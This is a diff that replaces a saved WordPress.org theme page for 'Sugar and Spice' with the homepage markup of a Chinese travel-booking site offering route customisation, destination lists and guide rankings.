@@ -1,594 +1,515 @@
-
-<!DOCTYPE html>
-<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US">
-<head profile="http://gmpg.org/xfn/11">
-<meta charset="utf-8" />
-<!--
-<meta property="fb:page_id" content="6427302910" />
--->
-<meta name="google-site-verification" content="7VWES_-rcHBcmaQis9mSYamPfNwE03f4vyTj4pfuAw0" />
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>WordPress &#8250; Sugar and Spice &laquo; Free WordPress Themes</title>
-<link href="//s.w.org/wp-includes/css/dashicons.css?20130130" rel="stylesheet" type="text/css" />
-<link href='//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,400,300,600&subset=latin,cyrillic-ext,greek-ext,greek,vietnamese,latin-ext,cyrillic' rel='stylesheet' type='text/css'>
-<link rel="stylesheet" href="//s.w.org/style/wp4.css?4" />
-<link media="only screen and (max-device-width: 480px)" href="//s.w.org/style/iphone.css?1" type="text/css" rel="stylesheet" />
-<link rel="shortcut icon" href="//s.w.org/favicon.ico" type="image/x-icon" />
-
-<script type="text/javascript">
-var _gaq = _gaq || [];
-_gaq.push(['_setAccount', 'UA-52447-1']);
-_gaq.push(['_setDomainName', 'wordpress.org']);
-_gaq.push(['_trackPageview']);
-(function() {
-	var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
-	ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
-	var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
-})();
-function recordOutboundLink(link, category, action) {
-	_gaq.push(['_trackEvent', category, action])
-	setTimeout('document.location = "' + link.href + '"', 100);
-}
-</script>
-<!--[if lte IE 8]>
-<style type="text/css">
-@import url("//s.w.org/style/ie.css?1");
-</style>
-<![endif]-->
-
-
-<style type="text/css">
-h3.top {
-	border-bottom: 1px solid #CCCCCC;
-	margin-bottom: 20px;
-}
-div.plugin-block {
-	margin-bottom: 20px;
-}
-.pending-theme {
-	line-height: 200%;
-}
-span.button {
-	padding: 3px;
-}
-.admin-message {
-	background-color: #FFFBCC;
-	border: 1px solid #E6DB55;
-	padding: 4px;
-	margin-bottom: 20px;
-}
-
-/* theme page (topic) */
-.block-content img.screenshot {
-	border: 1px solid #cccccc;
-	float: right;
-	margin-left: 10px;
-	margin-bottom: 10px;
-	padding: 5px;
-}
-#plugin-tags {
-	padding-top: 5px;
-	clear: both;
-}
-.col-3 p.button.preview-button {
-	background: #4EAF21;
-}
-.col-3 p.button.preview-button a:hover {
-	color: #ACFF90;
-}
-.col-3 p.button.parent-button {
-	background: #4E21AF;
-}
-.col-3 p.button.parent-button a:hover {
-	color: #AC90FF;
-}
-
-.postform {
-	clear: both;
-}
-
-.float-it-left {
-	float: left;
-	margin-right: 15px;
-}
-
-.filter-tag {
-	display: block;
-}
-</style>
-
-<meta name="generator" content="bbPress 1.1" />
-<link rel='stylesheet' id='forum-wp4-css'  href='http://s.wordpress.org/style/forum-wp4.css?ver=11' type='text/css' media='' />
-<link rel='stylesheet' id='style-wp4-css'  href='http://s.wordpress.org/bb-theme/plugins/style-wp4.css?ver=11' type='text/css' media='' />
-<!--[if IE 7]>
-<link rel='stylesheet' id='forum-ie7-css'  href='http://s.wordpress.org/style/forum-ie7.css?ver=7' type='text/css' media='' />
-<![endif]-->
-	<style type="text/css">
-	#theme-contributors .theme-contributor {
-		overflow: auto;
-		margin: 2px 0;
-	}
-	#theme-contributors .theme-contributor-info.no-profile {
-		line-height: 36px;
-	}
-	#theme-contributors .theme-contributor-gravatar img {
-		vertical-align: bottom;
-		margin-right: 8px;
-		margin-top: 4px;
-		border-radius: 3px;
-	}
-	#theme-contributors .theme-contributor-profile {
-		float:left;
-	}
-	#theme-contributors .theme-contributor-gravatar {
-		float:left;
-	}
-	#theme-contributors .theme-contributor-info {
-		margin: 6px 0 0;
-		line-height: 15px;
-	}
-	#theme-contributors .theme-contributor-links {
-		margin-top: 2px;
-		font-size: 11px;
-	}
-	#theme-contributors {
-		margin: 6px 0;
-		padding-bottom: 12px;
-		position: relative;
-		overflow: auto;
-	}
-	#theme-contributors h4.head {
-		display: inline-block;
-		float: left;
-		margin-top: 4px;
-		margin-right: 8px;
-	}
-	#theme-contributors .theme-authors {
-		display: inline-block;
-		float: left;
-		width: 300px;
-	}
-	</style>
-		<style type="text/css">
-	div.theme-notice {
-		border: 1px solid;
-		padding: 4px 12px;
-		margin-bottom: 20px;
-		border-radius: 6px;
-		overflow: auto;
-	}
-	div.theme-notice-approved {
-		background-color: #DFF2BF;
-		color: #4F8A10;
-	}
-	div.theme-notice-closed, div.theme-notice-disabled, div.theme-notice-rejected {
-		background-color: #FFBABA;
-		color: #D8000C;
-	}
-	div.theme-notice-open-old {
-		background-color: #FEEFB3;
-		color: #9F6000;
-	}
-	div.theme-notice-requested {
-		background-color: #BDE5F8;
-		color: #00529B;
-	}
-	div.theme-notice span:first-child {
-		padding: 1px 10px 3px;
-		border-radius: 25px;
-		color: white;
-		font-size: 18px;
-		font-weight: bold;
-		font-family: Verdana;
-		float: left;
-		margin: 0 8px 0 0;
-	}
-	div.theme-notice-approved span:first-child {
-		background-color: #4F8A10;
-	}
-	div.theme-notice-closed span:first-child, div.theme-notice-disabled span:first-child, div.theme-notice-rejected span:first-child {
-		background-color: #D8000C;
-	}
-	div.theme-notice-open-old span:first-child {
-		background-color: #9F6000;
-	}
-	div.theme-notice-requested span:first-child {
-		background-color: #00529B;
-	}
-	span.theme-notice-banner-msg {
-		float: left;
-		width: 95%;
-		line-height: 1.3em;
-		padding-top: 5px;
-	}
-
-	div.theme-notice-open-old {
-		padding-top: 8px;
-		padding-bottom: 8px;
-	}
-	div.theme-notice-open-old span.theme-notice-banner-msg {
-		padding-top: 0;
-	}
-	</style>
-		<style type="text/css">
-	#pagebody .support-sidebox p {
-		margin: 0 0 8px 0;
-	}
-	#theme-submit-support {
-		text-align: center;
-	}
-	#theme-submit-support a {
-		display: block;
-		margin: 4px auto 2px;
-		padding: 3px 6px;
-		border-radius: 6px;
-		border: 1px solid #000;
-		background-color: #439e47;
-		width: 60%;
-		color: #fff;
-	}
-	#theme-submit-support a:hover {
-		background-color: #218834;
-	}
-	div.support-sidebox {
-		margin: 6px 0;
-		padding-bottom: 12px;
-	}
-	div.support-sidebox h3.head {
-		padding-left: 0;
-		margin-bottom: 6px;
-	}
-	a.theme-support-link {
-		display: block;
-		text-align: center;
-	}
-	</style>
-	<link rel='stylesheet' href='http://wordpress.org/extend/themes-plugins/bb-ratings/bb-ratings.css?4' type='text/css' />
-<link rel="alternate" type="application/rss+xml" title="Free WordPress Themes &raquo; Topic: Sugar and Spice" href="http://wordpress.org/themes/rss/topic/sugar-and-spice" /><script type="text/javascript" src="//s.w.org/wp-includes/js/jquery/jquery.js?v=1.10.2"></script>
-<script>document.cookie='devicePixelRatio='+((window.devicePixelRatio === undefined) ? 1 : window.devicePixelRatio)+'; path=/';</script>
-<script type="text/javascript">
-var toggleMenu = function(){
-    var m = document.getElementById('wporg-header-menu'),
-        c = m.className;
-	    m.className = c.match( ' active' ) ? c.replace( ' active', '' ) : c + ' active';
-}
-</script>
+<!doctype html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>曦旅网</title>
+	<link rel="stylesheet" href="assets/css/bootstrap/css/bootstrap.css" />
+	<link rel="stylesheet" href="assets/css/index.css" />
+	<link rel="stylesheet" href="assets/css/homepage.css" />
 </head>
-
-<body id="wordpress-org" >
-<div id="wporg-header">
-	<div class="wrapper">
-	<a id="mobile-menu-button" class="" href="#" onclick="toggleMenu();"></a>
-	<h1><a href="//wordpress.org">WordPress.org</a></h1>				<div id="head-search">
-		<form action="//wordpress.org/search/do-search.php" method="get">
-			<input class="text" name="search" type="text" value="" maxlength="150" placeholder="Search WordPress.org" /> <input type="submit" class="button" value="" />
-		</form>
+<body>
+	<div class="header">
+		<div class="container">
+			<div class="search clearfix">
+				<a href="index.htm" class="logo"></a>
+				<form class="search-box" action="/search">
+	            	<input id="J-search" class="search-ipt" placeholder="输入你想去的地方"type="text" />
+	            	<span class="search-btn">Submit</span>
+	        	</form>
+	        	<p class="sep">
+		        	<a href="login.htm" class="login" >登录</a>
+		        	| 
+		        	<a href="register.htm" class="reg" > 注册新账号</a>
+		        </p>
+			</div>
+			<div class="menu clearfix">
+				<ul class="nav">
+					<li class="active"><a href="index2.html">首页</a></li>
+					<li><a href=""> 跟我走 </a></li>
+					<li><a href=""> 跟他走 </a></li>
+					<li><a href=""> 跟大家走</a></li>
+					<li><a href=""> 机票预订 </a></li>
+					<li><a href=""> 景点预定 </a></li>
+					<li><a href=""> 租车预定 </a></li>
+				</ul>
+			</div>
 		</div>
-				<div style="clear:both"></div>
+	</div>
+	<div class="bd">
+		<div class="container">
+			<!-- start -->
+			<div class="container-fluid banner">
+			  <div class="row-fluid">
+			    <div class="span5">
+			      <h2 id="headline">跟你走</h2>
+
+
+ <form class="form-horizontal">
+  	
+    <fieldset>
+      <div id="legend" class="">
+        <legend style="margin-top: 10px;" class="followyou">个性化定制你旅游路线</legend>
+      </div>
+   
+
+       <div class="control-group">
+          <!-- Select Basic -->
+          <label class="control-label">出发城市：</label>
+          <div class="controls">
+            <select class="input-xlarge">
+              <option>杭州</option>
+              <option>北京</option>
+              <option>上海</option>
+              <option>南京</option>
+              <option>苏州</option>
+              <option>温州</option>
+              <option>宁波</option>
+              <option>绍兴</option>
+              <option>南通</option>
+              <option>盐城</option>
+              <option>郑州</option>
+              <option>湖州</option>
+              <option>台州</option>
+              <option>其他</option>
+            </select>
+          </div>
+        </div>
+
+       <div class="control-group">
+          <!-- Select Basic -->
+          <label class="control-label">线路属性：</label>
+          <div class="controls">
+            <select class="input-xlarge">
+              <option>周边游</option>
+              <option>国内游</option>
+              <option>出境游</option>
+              <option>其他</option>
+            </select>
+          </div>
+        </div>
+
+       <div class="control-group">
+          <!-- Select Basic -->
+          <label class="control-label">线路类型：</label>
+          <div class="controls">
+            <select class="input-xlarge">
+              <option>跟团游</option>
+              <option>自助游</option>
+              <option>团队游</option>
+              <option>其他</option>
+            </select>
+          </div>
+        </div>
+
+       <div class="control-group">
+          <!-- Select Basic -->
+          <label class="control-label">线路天数：</label>
+          <div class="controls">
+            <select class="input-xlarge">
+              <option>一日游</option>
+              <option>二日游</option>
+              <option>三日游</option>
+              <option>四日游</option>
+              <option>五日游</option>
+              <option>六日游</option>
+              <option>七日游</option>
+              <option>七日以上游</option>
+            </select>
+          </div>
+        </div>
+
+<div class="control-group">
+          <!-- Select Basic -->
+          <label class="control-label">线路交通：</label>
+          <div class="controls">
+            <select class="input-xlarge">
+              <option>飞机</option>
+              <option>火车</option>
+              <option>自驾车</option>
+              <option>大巴</option>
+              <option>动车</option>
+			  <option>其他</option>
+            </select>
+          </div>
+        </div>
+       
+<div class="control-group">
+
+          <!-- Text input-->
+          <label class="control-label" for="input01">备注栏：   </label>
+          <div class="controls">
+            <input type="text" placeholder="如游览顺序，酒店..." class="input-xlarge">
+            
+          </div>
+        </div>
+
+<div class="control-group">
+          <label class="control-label">上传提交:       </label>
+
+          <!-- Button -->
+          <div class="controls">
+            <button class="btn btn-success">提交</button>
+          </div>
+        </div>
+
+
+
+          </fieldset>
+  </form>
+
+
+</div>
+
+
+			    <div class="span8">
+			      
+			    </div>
+			  </div>
+			</div>
+			<!-- end -->
+			<!-- start -->
+			<div class="container-fluid app-list">
+			  <div class="row-fluid">
+			    <div class="span9">
+			    	<!-- start up-fast -->
+			    <div class="hot-point">
+			    	<a href="#" title="更多线路" class="floatR">more&gt;&gt;</a>
+
+			      <a href=""><h3>近日热门旅游景点</h3></a></div>
+			      <div class="wrapper">
+				      <ul class="clearfix">
+				      	<li>
+				      		<a href="#" class="img J-pop" data-desc="">
+				      			<img src="assets/images/tian.jpg" />
+				      			<span class="desc">天堂之境</span>
+				      		</a>
+				      	</li>
+				      	<li>
+				      		<a href="#" class="img">
+				      			<img src="assets/images/tian.jpg" />
+				      			<span class="desc">天堂之境</span>
+				      		</a>
+				      	</li><li>
+				      		<a href="#" class="img">
+				      			<img src="assets/images/tian.jpg" />
+				      			<span class="desc">天堂之境</span>
+				      		</a>
+				      	</li><li>
+				      		<a href="#" class="img">
+				      			<img src="assets/images/tian.jpg" />
+				      			<span class="desc">天堂之境</span>
+				      		</a>
+				      	</li><li>
+				      		<a href="#" class="img">
+				      			<img src="assets/images/tian.jpg" />
+				      			<span class="desc">天堂之境</span>
+				      		</a>
+				      	</li><li>
+				      		<a href="#" class="img">
+				      			<img src="assets/images/tian.jpg" />
+				      			<span class="desc">天堂之境</span>
+				      		</a>
+				      	</li><li>
+				      		<a href="#" class="img">
+				      			<img src="assets/images/tian.jpg" />
+				      			<span class="desc">天堂之境</span>
+				      		</a>
+				      	</li><li>
+				      		<a href="#" class="img">
+				      			<img src="assets/images/tian.jpg" />
+				      			<span class="desc">天堂之境</span>
+				      		</a>
+				      	</li><li>
+				      		<a href="#" class="img">
+				      			<img src="assets/images/tian.jpg" />
+				      			<span class="desc">天堂之境</span>
+				      		</a>
+				      	</li>
+				      </ul>
+			  	  </div>
+
+			  	  <!-- end up-fast -->
+			  	  <!-- start update classic -->
+
+			  	   <div class="hot-point">
+			    	<a href="#" title="更多线路" class="floatR">more&gt;&gt;</a>
+
+			      <a href=""><h3>最新攻略展示</h3></a></div>
+			      <div class="wrapper">
+				      <ul class="clearfix">
+				      	<li>
+				      		<a href="#" class="img J-pop" data-desc="">
+				      			<img src="assets/images/san.jpg" />
+				      			<span class="desc">三亚七天旅游攻略</span>
+				      		</a>
+				      	</li>
+				      	<li>
+				      		<a href="#" class="img">
+				      			<img src="assets/images/san.jpg" />
+				      			<span class="desc">三亚七天旅游攻略</span>
+				      		</a>
+				      	</li><li>
+				      		<a href="#" class="img">
+				      			<img src="assets/images/san.jpg" />
+				      			<span class="desc">三亚七天旅游攻略</span>
+				      		</a>
+				      	</li><li>
+				      		<a href="#" class="img">
+				      			<img src="assets/images/san.jpg" />
+				      			<span class="desc">三亚七天旅游攻略</span>
+				      		</a>
+				      	</li><li>
+				      		<a href="#" class="img">
+				      			<img src="assets/images/san.jpg" />
+				      			<span class="desc">三亚七天旅游攻略</span>
+				      		</a>
+				      	</li><li>
+				      		<a href="#" class="img">
+				      			<img src="assets/images/san.jpg" />
+				      			<span class="desc">三亚七天旅游攻略</span>
+				      		</a>
+				      	</li>
+				      	
+				      </ul>
+			  	  </div>
+			  	  <!-- end update classic -->
+			    </div>
+			    <div class="span4">
+			    	<!-- start application-->
+				    <a href=""><h3>每周热门攻略排行</h3></a>
+				    <div class="right-list">
+				    	<ul>
+				    		<li class="clearfix J-pop2"  data-desc="">
+				    			<span class="index">1</span>
+				    			<span class="img J-pop3"><img src="assets/images/gonglue1.jpg" /></span>
+				    			<span class="desc J-pop3">云南7天游</span>
+				    			<span class="status-icon1 J-status"></span>
+				    			
+				    		</li>
+				    		<li class="clearfix">
+				    			<span class="index">2</span>
+				    			<span class="img"><img src="assets/images/gonglue1.jpg" /></span>
+				    			<span class="desc">西塘古镇水乡两天游</span>
+				    			<span class="status-icon2  J-status"></span>
+				    			
+				    		</li>
+				    		<li class="clearfix">
+				    			<span class="index">3</span>
+				    			<span class="img"><img src="assets/images/gonglue1.jpg" /></span>
+				    			<span class="desc">张家界+湘西+凤凰7天团队游</span>
+				    			<span class="status-icon2"></span>
+				    			
+				    		</li>
+				    		<li class="clearfix">
+				    			<span class="index">4</span>
+				    			<span class="img"><img src="assets/images/gonglue1.jpg" /></span>
+				    			<span class="desc">香港三天团队游</span>
+				    			<span class="status-icon3"></span>
+				    			
+				    		</li>
+				    		<li class="clearfix">
+				    			<span class="index">5</span>
+				    			<span class="img"><img src="assets/images/gonglue1.jpg" /></span>
+				    			<span class="desc">武汉3天自驾游</span>
+				    			<span class="status-icon3"></span>
+				    			
+				    		</li>
+				    		<li class="clearfix">
+				    			<span class="index">6</span>
+				    			<span class="img"><img src="assets/images/gonglue1.jpg" /></span>
+				    			<span class="desc">韩国济州团队游</span>
+				    			<span class="status-icon4"></span>
+				    			
+				    		</li>
+				    		<li class="clearfix">
+				    			<span class="index">7</span>
+				    			<span class="img"><img src="assets/images/gonglue1.jpg" /></span>
+				    			<span class="desc">土耳其11天自助游</span>
+				    			<span class="status-icon2"></span>
+				    			
+				    		</li>
+				    		<li class="clearfix">
+				    			<span class="index">8</span>
+				    			<span class="img"><img src="assets/images/gonglue1.jpg" /></span>
+				    			<span class="desc">北京8天自助游</span>
+				    			<span class="status-icon2"></span>
+				    			
+				    		</li>
+				    		<li class="clearfix">
+				    			<span class="index">9</span>
+				    			<span class="img"><img src="assets/images/gonglue1.jpg" /></span>
+				    			<span class="desc">南京4天跟团游</span>
+				    			<span class="status-icon2"></span>
+				    			
+				    		</li>
+				    		<li class="clearfix">
+				    			<span class="index">10</span>
+				    			<span class="img"><img src="assets/images/gonglue1.jpg" /></span>
+				    			<span class="desc">三亚7天旅游攻略</span>
+				    			<span class="status-icon1"></span>
+				    			
+				    		</li>
+				    	</ul>
+			    	</div>
+			    	<!-- end application -->
+			    	<!-- start game-->
+			    	<a href=""><h3>年度热门攻略排行</h3></a>
+				    <div class="right-list">
+				    	<ul>
+				    		<li class="clearfix J-pop2"  data-desc="">
+				    			<span class="index">1</span>
+				    			<span class="img J-pop3"><img src="assets/images/gonglue2.jpg" /></span>
+				    			<span class="desc J-pop3">云南7天游</span>
+				    			<span class="status-icon1 J-status"></span>
+				    			
+				    		</li>
+				    		<li class="clearfix">
+				    			<span class="index">2</span>
+				    			<span class="img"><img src="assets/images/gonglue2.jpg" /></span>
+				    			<span class="desc">西塘古镇水乡两天游</span>
+				    			<span class="status-icon2  J-status"></span>
+				    			
+				    		</li>
+				    		<li class="clearfix">
+				    			<span class="index">3</span>
+				    			<span class="img"><img src="assets/images/gonglue2.jpg" /></span>
+				    			<span class="desc">张家界+湘西+凤凰7天团队游</span>
+				    			<span class="status-icon2"></span>
+				    			
+				    		</li>
+				    		<li class="clearfix">
+				    			<span class="index">4</span>
+				    			<span class="img"><img src="assets/images/gonglue2.jpg" /></span>
+				    			<span class="desc">香港三天团队游</span>
+				    			<span class="status-icon3"></span>
+				    			
+				    		</li>
+				    		<li class="clearfix">
+				    			<span class="index">5</span>
+				    			<span class="img"><img src="assets/images/gonglue2.jpg" /></span>
+				    			<span class="desc">武汉3天自驾游</span>
+				    			<span class="status-icon3"></span>
+				    			
+				    		</li>
+				    		<li class="clearfix">
+				    			<span class="index">6</span>
+				    			<span class="img"><img src="assets/images/gonglue2.jpg" /></span>
+				    			<span class="desc">韩国济州团队游</span>
+				    			<span class="status-icon4"></span>
+				    			
+				    		</li>
+				    		<li class="clearfix">
+				    			<span class="index">7</span>
+				    			<span class="img"><img src="assets/images/gonglue2.jpg" /></span>
+				    			<span class="desc">土耳其11天自助游</span>
+				    			<span class="status-icon2"></span>
+				    			
+				    		</li>
+				    		<li class="clearfix">
+				    			<span class="index">8</span>
+				    			<span class="img"><img src="assets/images/gonglue2.jpg" /></span>
+				    			<span class="desc">北京8天自助游</span>
+				    			<span class="status-icon2"></span>
+				    			
+				    		</li>
+				    		<li class="clearfix">
+				    			<span class="index">9</span>
+				    			<span class="img"><img src="assets/images/gonglue2.jpg" /></span>
+				    			<span class="desc">南京4天跟团游</span>
+				    			<span class="status-icon2"></span>
+				    			
+				    		</li>
+				    		<li class="clearfix">
+				    			<span class="index">10</span>
+				    			<span class="img"><img src="assets/images/gonglue2.jpg" /></span>
+				    			<span class="desc">三亚7天旅游攻略</span>
+				    			<span class="status-icon1"></span>
+				    			
+				    		</li>
+				    	</ul>
+			    	</div>
+			    	<!-- end game -->
+			  </div>
+			</div>
+			<!-- end -->
+
+		</div>
+	</div>
+	<div class="footer">
+		<div class="container">
+			<ul class="clearfix">
+				
+				<li class="link">
+					<h3>曦旅网</h3>
+					<ul>
+						<li><a href="#">关于我们</a></li>
+						<li><a href="#">加入我们</a></li>
+						<li><a href="#">商务合作</a></li>
+
+					</ul>
+				</li>
+				<li class="link">
+					<h3>帮助与支持</h3>
+					<ul>
+						<li><a href="">帮助中心</a></li>
+						<li><a href="">使用条款</a></li>
+						<li><a href="">用户隐私</a></li>
+
+					</ul>
+				</li>
+				<li class="link">
+					<h3>关注我们</h3>
+					<ul>
+						<li class="weibo-icon"><a href="http://weibo.com/" target="_blank">@曦旅网</a></li>
+						<li class="twitter-icon"><a href="https://twitter.com/"  target="_blank">@曦旅网</a></li>
+
+					</ul>
+				</li>
+				<li class="link">
+					<h3>推荐给朋友</h3>
+					<div>
+						<script type="text/javascript" charset="utf-8">
+							(function(){
+							  var _w = 90 , _h = 24;
+							  var param = {
+							    url:'http://alankell.com/trip',
+							    type:'2',
+							    count:'1', /**是否显示分享数，1显示(可选)*/
+							    appkey:'', /**您申请的应用appkey,显示分享来源(可选)*/
+							    title:'一起来使用曦旅网吧！', /**分享的文字内容(可选，默认为所在页面的title)*/
+							    pic:'', /**分享图片的路径(可选)*/
+							    ralateUid:'1877176894', /**关联用户的UID，分享微博会@该用户(可选)*/
+								language:'zh_cn', /**设置语言，zh_cn|zh_tw(可选)*/
+							    rnd:new Date().valueOf()
+							  }
+							  var temp = [];
+							  for( var p in param ){
+							    temp.push(p + '=' + encodeURIComponent( param[p] || '' ) )
+							  }
+							  document.write('<iframe allowTransparency="true" frameborder="0" scrolling="no" src="http://hits.sinajs.cn/A1/weiboshare.html?' + temp.join('&') + '" width="'+ _w+'" height="'+_h+'"></iframe>')
+							})()
+						</script>
+					</div>
+				</li>
+			</ul>
 		
-<ul id="wporg-header-menu">
-<li><a href='//wordpress.org/showcase/' title='See some of the sites built on WordPress.'>Showcase</a></li>
-<li><a href='//wordpress.org/themes/' title='Find just the right look for your website.' class="current">Themes</a><div class="uparrow"></div></li>
-<li><a href='//wordpress.org/plugins/' title='Plugins can extend WordPress to do almost anything you can imagine.'>Plugins</a></li>
-<li><a href='//wordpress.org/mobile/' title='Take your website on the go!'>Mobile</a></li>
-<li><a href='//wordpress.org/support/' title='Forums, documentation, help.'>Support</a><ul class="nav-submenu"><li><a href='//wordpress.org/support/' title='Support and discussion forums.'>Forums</a></li><li><a href='//codex.wordpress.org/Main_Page' title='Documentation, tutorials, best practices.'>Documentation</a></li></ul><div class="uparrow"></div></li>
-<li><a href='//make.wordpress.org/' title='Contribute your knowledge.'>Get Involved</a><ul class="nav-submenu"><li><a href='//make.wordpress.org/core/' title='Write the code.'>Core</a></li><li><a href='//make.wordpress.org/ui/' title='Improve the interface.'>UI</a></li><li><a href='//make.wordpress.org/accessibility/' title='Create a better experience.'>Accessibility</a></li><li><a href='//make.wordpress.org/plugins/' title='Extend the system.'>Plugins</a></li><li><a href='//make.wordpress.org/themes/' title='Beautify the web.'>Themes</a></li><li><a href='//make.wordpress.org/support/' title='Help the users.'>Support</a></li><li><a href='//make.wordpress.org/polyglots/' title='Translate for the world.'>Polyglots</a></li><li><a href='//make.wordpress.org/community/' title='Organize with others.'>Community</a></li><li><a href='//make.wordpress.org/mobile/' title='On the go.'>Mobile</a></li></ul><div class="uparrow"></div></li>
-<li><a href='//wordpress.org/about/' title='About the WordPress Organization, and where we&#039;re going.'>About</a></li>
-<li><a href='//wordpress.org/news/' title='Come here for the latest scoop.'>Blog</a></li>
-<li><a href='//wordpress.org/hosting/' title='Find a home for your blog.'>Hosting</a></li>
-<li id="download" class="button download-button"><a href='//wordpress.org/download/' title='Get it. Got it? Good.'>Download WordPress</a></li>
-</ul>
-		<div style="clear:both"></div>
+			<div class="bt">
+	            <span class="copyright">© 2013- 2014 •	曦旅网
+	            </span>
+	            <p class="beian">
+	                <a target="_blank" href="http://www.miibeian.gov.cn" rel="nofollow" class="meta">京ICP证111039号</a>
+	                <span class="meta">・</span>
+	               
+	            </p>
+	        </div>
+        </div>
 	</div>
-</div>
-
-<div id="download-mobile">
-    <div class="wrapper">
-        <span class="download-ready">Ready to get started?</span><a class="button download-button" href="//wordpress.org/download/" title="Get it. Got it? Good.">Download WordPress</a>
-    </div>
-</div>
-
-<div id="headline">
-	<div class="wrapper">
-		<a href="/themes/"><h2>Themes Directory</h2></a>
-
-		<form class="login" method="post" action="https://wordpress.org/support/bb-login.php">
-<p><label>Username		<input class="text" name="user_login" type="text" id="user_login" size="13" maxlength="40" value="" />
-  </label>
-	<label>Password		<input class="text" name="password" type="password" id="password" size="13" maxlength="100" />
-	</label>
-	<input name="re" type="hidden" value="" />
-	<input type="submit" class="button-secondary" name="Submit" id="submit" value="Log in" />
-	(<a href="//wordpress.org/support/bb-login.php">forgot?</a>) or <a href="//wordpress.org/support/register.php">Register</a></p>
-</form>
-
-	</div>
-</div>
-
-
-<div id="pagebody">
-        <div class="wrapper">
-
-
-                <div class="col-2" id="sidebar">
-                                                <ul class="submenu">
-  <li>Extending WordPress</li>  
-  <li><a href="/plugins/">Plugins</a></li>
-  <li><a href="/themes/">Themes</a>
-	<ul style='padding: 0; margin: 6px 0;'>
-		<li class='view'><a href='/themes/commercial/'>Commercial</a></li>
-		<li class='view'><a href='/themes/about/'>More Info</a></li>
-		<li class='view'><a href='/themes/contact/'>Contact Us</a></li>
-	</ul>
-  </li>
-  <li><a href='/mobile/'>Mobile</a></li>
-  <li><a href='/ideas/'>Ideas</a></li>
-  <li><a href='/extend/kvetch/'>Kvetch!</a></li>
-</ul>
-
-<h4>Search Themes</h4><form id='side-search' method='get' action='//wordpress.org/themes/search.php'>
-<div>
-	<input type='text' class='text' name='q' value='' />
-	<input type='submit' class='button' value='Search' /><br class='clear' />
-</div>
-</form>
-
-
-                </div>
-
-
-
-		<div class="col-10">
-
-
-<link rel="stylesheet" href="/extend/extend-themes/themes/thickbox/thickbox.css" type="text/css" media="screen" />
-<script type="text/javascript" src="/extend/extend-themes/themes/thickbox/thickbox.js"></script>
-<script type="text/javascript" src="/extend/extend-themes/themes/thickbox/theme-preview.js"></script>
-
-<div itemscope itemtype="http://schema.org/Product">
-
-
-<div class="col-7">
-
-	<div id="plugin-title">
-		<h2 itemprop="name">Sugar and Spice</h2>
-	</div>
-
-<div id="plugin-info" class="theme-info block description">
-
-<div style="display: none" class="available-theme">
-<a class="previewlink" href="http://wp-themes.com/sugar-and-spice?TB_iframe=true&width=600&height=400">Preview of &quot;Sugar and Spice&quot;</a> <a class="activatelink" href="//wordpress.org/themes/download/sugar-and-spice.1.2.zip">Download &quot;Sugar and Spice&quot;</a>
-</div>
-
-<div class="head head-big">
-	<ul id="sections">
-		<li class="section-description current">
-			<a href="//wordpress.org/themes/sugar-and-spice">Description</a>
-		</li>
-		<li class="section-stats ">
-			<a href="//wordpress.org/themes/sugar-and-spice/stats/">Stats</a>
-		</li>
-		<li class="section-support ">
-			<a href="//wordpress.org/support/theme/sugar-and-spice/">Support</a>
-		</li>
-		<li class="section-reviews ">
-			<a href="//wordpress.org/support/view/theme-reviews/sugar-and-spice/">Reviews</a>
-		</li>
-		<li class="section-developers ">
-			<a href="//wordpress.org/themes/sugar-and-spice/developers/">Developers</a>
-		</li>
-			</ul>
-</div>
-
-<div class="block-content">	<div id="theme-contributors" class="sidebox block">
-		<a name="theme-contributors"></a>
-		<h4 class="head"><span class="info-marker">Author: </span></h4>
-		<div class="theme-authors">
-			<div class='theme-contributor'>
-			<a class='theme-contributor-gravatar' rel='author' href='//profiles.wordpress.org/alex27'><img alt="" src="http://www.gravatar.com/avatar/1d53cc9cd1cc1ea7bc0c977d189f4c68?s=36&amp;d=monsterid&amp;r=pg" class="photo avatar avatar-36" style="height:36px; width:36px;" /></a>
-			<div class='theme-contributor-info'>
-				<div>
-				<a href='//profiles.wordpress.org/alex27/'>alex27</a></div>
-				<div class='theme-contributor-links'>4 themes
-			</div></div>
-			</div>		</div>
-	</div>
-			<a href="http://wp-themes.com/sugar-and-spice?TB_iframe=true&width=600&height=400" class="thickbox"><img class="screenshot" style="width: 240px; height: 180px;" src="//ts.w.org/wp-content/themes/sugar-and-spice/screenshot.png?ver=1.2" alt="" /></a>
-	Sugar and Spice is chic, feminine theme created with wedding blogs and wedding industry in mind. Features include option to upload your own logo &amp; favicon, customizable colors and background, 3 different layout options. And guess what - it's responsive too! Perfect for wedding related businesses - event planners, florists, photographers, cupcake shops or bakeries. Showcase your brand with style!	<div id="plugin-tags">
-		<strong>Tags:</strong> <a href="http://wordpress.org/themes/tags/custom-background" rel="tag">custom-background</a>, <a href="http://wordpress.org/themes/tags/custom-menu" rel="tag">custom-menu</a>, <a href="http://wordpress.org/themes/tags/featured-images" rel="tag">featured-images</a>, <a href="http://wordpress.org/themes/tags/fixed-layout" rel="tag">fixed-layout</a>, <a href="http://wordpress.org/themes/tags/full-width-template" rel="tag">full-width-template</a>, <a href="http://wordpress.org/themes/tags/gray" rel="tag">gray</a>, <a href="http://wordpress.org/themes/tags/light" rel="tag">light</a>, <a href="http://wordpress.org/themes/tags/responsive-layout" rel="tag">responsive-layout</a>, <a href="http://wordpress.org/themes/tags/theme-options" rel="tag">theme-options</a>, <a href="http://wordpress.org/themes/tags/threaded-comments" rel="tag">threaded-comments</a>, <a href="http://wordpress.org/themes/tags/translation-ready" rel="tag">translation-ready</a>, <a href="http://wordpress.org/themes/tags/two-columns" rel="tag">two columns</a>, <a href="http://wordpress.org/themes/tags/white" rel="tag">white</a>	</div>
-	</div><!-- block-content-->
-</div> <!-- available-theme -->
-
-<div id="ajax-response"></div>
-
-
-	
-	
-</div><!-- col-7 -->
-
-<div class="col-3">
-	<p class="button"><a href='//wordpress.org/themes/download/sugar-and-spice.1.2.zip'>Download Version 1.2</a></p>
